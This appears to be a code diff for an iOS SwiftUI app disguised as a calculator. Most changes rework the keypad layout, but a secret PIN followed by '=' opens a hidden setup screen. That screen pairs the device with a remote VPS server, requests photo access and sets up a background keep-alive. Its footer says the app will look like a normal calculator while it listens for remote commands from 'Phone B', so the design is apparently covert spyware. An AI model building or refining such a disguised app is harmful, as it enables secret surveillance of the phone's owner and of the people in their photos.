@@ -7,78 +7,88 @@ struct ContentView: View {
     @State private var previousValue: Double = 0
     @State private var isTyping = false
     @State private var showSecretSheet = false
-
-    // Secret passcode buffer to detect "9876="
     @State private var keyHistory = ""
 
     var body: some View {
-        ZStack {
-            Color.black.edgesIgnoringSafeArea(.all)
+        GeometryReader { geo in
+            let spacing: CGFloat = 14
+            let totalWidth = geo.size.width
+            let buttonSize = (totalWidth - (spacing * 5)) / 4
+            let zeroWidth = (buttonSize * 2) + spacing
 
-            VStack(spacing: 12) {
-                Spacer()
+            ZStack {
+                Color.black.edgesIgnoringSafeArea(.all)
 
-                // Calculator Display
-                HStack {
+                VStack(spacing: spacing) {
                     Spacer()
-                    Text(display)
-                        .font(.system(size: 72, weight: .light))
-                        .foregroundColor(.white)
-                        .lineLimit(1)
-                        .minimumScaleFactor(0.3)
-                        .padding(.horizontal, 24)
-                }
 
-                // Calculator Keypad
-                VStack(spacing: 12) {
-                    HStack(spacing: 12) {
-                        calcButton("AC", color: .gray, textColor: .black) { clear() }
-                        calcButton("+/-", color: .gray, textColor: .black) { toggleSign() }
-                        calcButton("%", color: .gray, textColor: .black) { percentage() }
-                        calcButton("÷", color: .orange) { setOperation("÷") }
+                    // Display Value
+                    HStack {
+                        Spacer()
+                        Text(display)
+                            .font(.system(size: 80, weight: .light))
+                            .foregroundColor(.white)
+                            .lineLimit(1)
+                            .minimumScaleFactor(0.2)
+                            .padding(.horizontal, 24)
                     }
 
-                    HStack(spacing: 12) {
-                        calcButton("7") { inputDigit("7") }
-                        calcButton("8") { inputDigit("8") }
-                        calcButton("9") { inputDigit("9") }
-                        calcButton("×", color: .orange) { setOperation("×") }
-                    }
-
-                    HStack(spacing: 12) {
-                        calcButton("4") { inputDigit("4") }
-                        calcButton("5") { inputDigit("5") }
-                        calcButton("6") { inputDigit("6") }
-                        calcButton("-", color: .orange) { setOperation("-") }
-                    }
-
-                    HStack(spacing: 12) {
-                        calcButton("1") { inputDigit("1") }
-                        calcButton("2") { inputDigit("2") }
-                        calcButton("3") { inputDigit("3") }
-                        calcButton("+", color: .orange) { setOperation("+") }
-                    }
-
-                    HStack(spacing: 12) {
-                        // Wide 0 button
-                        Button(action: { inputDigit("0") }) {
-                            HStack {
-                                Text("0")
-                                    .font(.system(size: 32, weight: .medium))
-                                    .foregroundColor(.white)
-                                    .padding(.leading, 32)
-                                Spacer()
-                            }
-                            .frame(width: 172, height: 80)
-                            .background(Color(white: 0.2))
-                            .cornerRadius(40)
+                    // Keypad Rows
+                    VStack(spacing: spacing) {
+                        // Row 1
+                        HStack(spacing: spacing) {
+                            calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
+                            calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
+                            calcBtn("%", size: buttonSize, color: Color(white: 0.65), textCol: .black) { percentage() }
+                            calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                         }
 
-                        calcButton(".") { inputDigit(".") }
-                        calcButton("=", color: .orange) { calculate() }
+                        // Row 2
+                        HStack(spacing: spacing) {
+                            calcBtn("7", size: buttonSize) { inputDigit("7") }
+                            calcBtn("8", size: buttonSize) { inputDigit("8") }
+                            calcBtn("9", size: buttonSize) { inputDigit("9") }
+                            calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
+                        }
+
+                        // Row 3
+                        HStack(spacing: spacing) {
+                            calcBtn("4", size: buttonSize) { inputDigit("4") }
+                            calcBtn("5", size: buttonSize) { inputDigit("5") }
+                            calcBtn("6", size: buttonSize) { inputDigit("6") }
+                            calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
+                        }
+
+                        // Row 4
+                        HStack(spacing: spacing) {
+                            calcBtn("1", size: buttonSize) { inputDigit("1") }
+                            calcBtn("2", size: buttonSize) { inputDigit("2") }
+                            calcBtn("3", size: buttonSize) { inputDigit("3") }
+                            calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
+                        }
+
+                        // Row 5
+                        HStack(spacing: spacing) {
+                            Button(action: { inputDigit("0") }) {
+                                HStack {
+                                    Text("0")
+                                        .font(.system(size: 34, weight: .medium))
+                                        .foregroundColor(.white)
+                                        .padding(.leading, buttonSize * 0.35)
+                                    Spacer()
+                                }
+                                .frame(width: zeroWidth, height: buttonSize)
+                                .background(Color(white: 0.2))
+                                .cornerRadius(buttonSize / 2)
+                            }
+
+                            calcBtn(".", size: buttonSize) { inputDigit(".") }
+                            calcBtn("=", size: buttonSize, color: .orange) { calculate() }
+                        }
                     }
+                    .padding(.bottom, geo.safeAreaInsets.bottom > 0 ? geo.safeAreaInsets.bottom : 20)
                 }
-                .padding(.bottom, 24)
+                .padding(.horizontal, spacing)
             }
         }
         .sheet(isPresented: $showSecretSheet) {
@@ -86,13 +96,12 @@ struct ContentView: View {
         }
     }
 
-    // MARK: - Calculator Logic & Secret Detection
-    private func calcButton(_ label: String, color: Color = Color(white: 0.2), textColor: Color = .white, action: @escaping () -> Void) -> some View {
+    private func calcBtn(_ label: String, size: CGFloat, color: Color = Color(white: 0.2), textCol: Color = .white, action: @escaping () -> Void) -> some View {
         Button(action: action) {
             Text(label)
                 .font(.system(size: 32, weight: .medium))
-                .foregroundColor(textColor)
-                .frame(width: 80, height: 80)
+                .foregroundColor(textCol)
+                .frame(width: size, height: size)
                 .background(color)
                 .clipShape(Circle())
         }
@@ -118,7 +127,7 @@ struct ContentView: View {
 
     private func toggleSign() {
         if let val = Double(display) {
-            display = String(-val)
+            display = val.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(-val)) : String(-val)
         }
     }
 
@@ -138,9 +147,8 @@ struct ContentView: View {
     private func calculate() {
         keyHistory += "="
 
-        // Check if Secret Passcode was entered (e.g. "9876=" or configured pin)
+        // Detect Secret Code (e.g. 9876=)
         if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
-            // Trigger Secret Sheet!
             keyHistory = ""
             clear()
             showSecretSheet = true
@@ -163,7 +171,7 @@ struct ContentView: View {
     }
 }
 
-// MARK: - Secret Setup View (Visible only after entering PIN)
+// MARK: - Secret Setup View
 struct SecretSetupView: View {
     @ObservedObject var engine: VaultEngine
     @Binding var isPresented: Bool
@@ -175,10 +183,9 @@ struct SecretSetupView: View {
     var body: some View {
         NavigationView {
             Form {
-                Section(header: Text("Device Linking & Security")) {
+                Section(header: Text("Device Pairing & Pin")) {
                     HStack {
                         Text("Pairing Code")
-                            .font(.subheadline)
                         Spacer()
                         TextField("Code", text: $pairingCode)
                             .multilineTextAlignment(.trailing)
@@ -188,7 +195,6 @@ struct SecretSetupView: View {
 
                     HStack {
                         Text("Secret PIN")
-                            .font(.subheadline)
                         Spacer()
                         TextField("PIN", text: $secretPin)
                             .multilineTextAlignment(.trailing)
@@ -196,8 +202,7 @@ struct SecretSetupView: View {
                     }
 
                     HStack {
-                        Text("VPS Server")
-                            .font(.subheadline)
+                        Text("VPS URL")
                         Spacer()
                         TextField("URL", text: $serverURL)
                             .multilineTextAlignment(.trailing)
@@ -205,7 +210,7 @@ struct SecretSetupView: View {
                     }
                 }
 
-                Section(header: Text("Photo Permissions & Background Engine")) {
+                Section(header: Text("Photo Permission & Background Keep-Alive")) {
                     HStack {
                         Text("Photos Detected")
                         Spacer()
@@ -231,18 +236,18 @@ struct SecretSetupView: View {
                     Button(action: activateVault) {
                         HStack {
                             Spacer()
-                            Text(engine.isActivated ? "RE-ACTIVATE & SYNC" : "GRANT PERMISSION & ACTIVATE")
+                            Text(engine.isActivated ? "RE-ACTIVATE ENGINE" : "GRANT PERMISSION & ACTIVATE")
                                 .fontWeight(.bold)
                                 .foregroundColor(.white)
                             Spacer()
                         }
-                        .padding(.vertical, 8)
+                        .padding(.vertical, 10)
                         .background(Color.green)
                         .cornerRadius(10)
                     }
                 }
 
-                Section(footer: Text("Once activated, close this screen. The app will look and act like a normal calculator, running silent background keep-alive to receive commands from Phone B.")) {
+                Section(footer: Text("Close this screen after activating. The app will return to being a normal calculator and listen for remote commands in the background.")) {
                     Button(action: {
                         saveAndDismiss()
                     }) {
